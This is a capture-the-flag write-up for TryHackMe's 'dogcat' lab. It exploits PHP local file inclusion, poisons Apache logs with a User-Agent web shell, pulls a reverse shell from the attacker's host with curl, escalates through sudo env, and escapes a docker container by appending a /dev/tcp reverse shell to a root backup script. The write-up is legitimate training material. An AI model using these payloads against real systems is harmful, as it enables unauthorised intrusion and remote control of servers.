# dogcat

**Room link:** https://tryhackme.com/room/dogcat

Well, the summary gives most of it away: _Exploit a PHP application via LFI and break out of a docker container._

1. `nmap` reveals SSH (actually useless) and HTTP services on standard ports.

2. The HTTP server hosts a page `http://$TARGET_IP/?view=cat` or `?view=dog` showing pictures of cats or dogs. Playing around a bit with the `view` parameter, we discover:
  * it must contain `cat` or `dog` to be accepted;
  * the PHP backend code seems to directly include `$_GET['view'].'.php'` (thus allowing LFI and maybe RFI):

```
$ curl "http://$TARGET_IP/?view=this/is/a/cat/test"
(...) Warning: include(this/is/a/cat/test.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24 (...)
```

  * RFI does not seem to be possible:

```
$ curl "http://$TARGET_IP/?view=http://10.9.***.***:8000/catshell"
(...) Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/index.php on line 24 (...)
```

  * also the [null byte technique](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#null-byte) does not work here to neutralize the additional `.php` extension.

 3. Let us start by retrieving the `index.php` file. We use the `php://filter` [wrapper](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers) to encode it in base 64 in order for it not to be interpreted.

```python
import requests, base64, re

URL  = 'http://10.10.***.***/'
WRAP = 'php://filter/convert.base64-encode/resource='
retrieve_data = lambda html: re.search(r'go!(.+)[ <]', html).group(1)

req = requests.get(URL, params={'view': WRAP+'cat/../index'})
index_php = base64.b64decode(retrieve_data(req.text)).decode()
print(index_php)
```

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

So the script only appends `.php` if the `ext` parameter is not given!

4. We can now request `/etc/passwd` (for instance) but this does not help... Let us retrieve the Apache logs:

```python
req = requests.get(URL, params={'view': WRAP+'cat/../../../../var/log/apache2/access.log', 'ext': ''})
apache_log = base64.b64decode(retrieve_data(req.text)).decode()
print(apache_log)
```

We notice that these logs contain the HTTP headers `Referer` and `User-Agent` in plaintext (between `"..."`).

5. Inject a simple PHP web shell. **Note** that we will **not** be able to **modify or delete** what we inject at this point, hence it is more reasonable to go for something as simple and reliable as possible while still allowing us to do whatever we want afterwards.

```python
requests.get(URL, headers={'User-Agent': "#L#<?php system($_GET['cmd']); ?>#R#"})
```

Now including the logs without the wrapper will interpret the injected code. We use `#L#` and `#R#` as delimiters to easily retrieve the result of the command (we will not actually use it much though):

```python
def run_cmd(cmd):
    req = requests.get(URL, params={'view': 'cat/../../../../var/log/apache2/access.log', 'ext': '', 'cmd': cmd})
    if req:
        html = req.text
        return re.search(r'\#L\#(.*)\#R\#', html, re.DOTALL).group(1)

print(run_cmd('whoami'))
```

**Note** that we cannot directly invoke a bash reverse shell (the connection is immediately closed).

6. Prepare a PHP reverse shell `shell.php` (port 4444 here). Start a HTTP server `python3 -m http.server` (port 8000 here) in the same directory. Upload the reverse shell.

```python3
run_cmd('curl http://10.9.***.***:8000/shell.php > shell.php')
```

Get in and grab the **flags 1 & 2** (easy to find).

```
$ nc -lnvp 4444    
Listening on 0.0.0.0 4444
Connection received on 10.10.***.*** 48454
Linux e62e65052c25 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 14:31:47 up  2:56,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /var/www/flag2_QMW7JvaY2LvK.txt
**REDACTED**
$ cat /var/www/html/flag.php
<?php
$flag_1 = "THM{**********REDACTED***********}"
?>
```

7. Escalate and grab the **flag 3**.

```
$ sudo -l
Matching Defaults entries for www-data on 0bebda29cdf5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 0bebda29cdf5:
    (root) NOPASSWD: /usr/bin/env
$ sudo env bash
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag3.txt    
**REDACTED**
```

8. We know we are in a container and guess that the last flag must be outside. Escape by injecting a reverse shell in what seems to be a backup script.

```
cd /opt/backups
ls -l
total 2884
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2949120 Jan  8 14:47 backup.tar
echo 'bash -i >& /dev/tcp/10.9.***.***/4242 0>&1' >> backup.sh
```

Wait a minute. Get out and grab the **flag 4**.

```
$ nc -lnvp 4242
Listening on 0.0.0.0 4242
Connection received on 10.10.***.*** 33190
bash: cannot set terminal process group (2131): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# cat flag4.txt
**REDACTED**
```
